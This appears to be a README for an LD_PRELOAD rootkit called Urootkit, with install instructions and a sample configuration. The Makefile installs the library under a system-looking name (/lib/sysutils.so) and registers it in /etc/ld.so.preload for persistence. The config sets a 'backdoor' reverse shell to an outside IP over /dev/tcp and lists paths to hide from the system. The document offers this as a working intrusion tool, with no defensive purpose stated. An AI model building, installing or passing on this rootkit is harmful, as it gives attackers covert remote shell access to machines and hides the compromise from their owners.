# Urootkit
The userland LD_PRELOAD rootkit
Reference: https://github.com/ngn13/cerez

## Make
```shell
apt update && apt install build-essential libconfig-dev

make && make install
```
Makefile:
```shell
SRCS = $(wildcard *.c)
HEADERS = $(wildcard *.h)

dist/loader.so: $(SRCS) $(HEADERS)
	mkdir -p dist
	gcc -shared -fPIC $(SRCS) -o $@ -ldl -lconfig -nostartfiles

install:
	cp uroot.cfg /etc/uroot.cfg
	cp dist/loader.so /lib/sysutils.so 
	echo /lib/sysutils.so > /etc/ld.so.preload
```
## USE
uroot.cfg:
```shell
backdoor = "bash -c 'bash -i >& /dev/tcp/123.249.89.38/50001 0>&1'";

hidden = (  
  { path = "/etc/uroot.cfg" },
  { path = "/tmp/test" }
);
```
- backdoor: is the urootkit will do when the hooked function is runing
- hidden: the path you want to hide